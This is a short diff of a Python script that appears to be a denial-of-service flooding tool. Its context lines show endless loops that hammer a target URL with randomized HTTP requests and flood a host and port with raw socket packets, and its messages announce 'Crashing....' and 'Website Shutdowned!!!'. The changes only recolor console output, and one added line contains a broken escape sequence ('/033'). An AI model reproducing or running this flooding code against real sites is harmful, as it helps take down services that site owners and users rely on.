@@ -27,7 +27,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mPlease wait...\033[0m")
+			print("\033[93mPlease wait...\033[93m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -41,13 +41,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"Crashing....")
+				print ("\033[91mCrashing....\033[91m")
 			else:
 				s.shutdown(1)
-				print("Website Shutdowned!!!")
+				print("\033[92mWebsite Shutdowned!!!\033[92m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91\033[0m")
+		print("/033[91mError/033[91m")
 		time.sleep(.1)
 
 
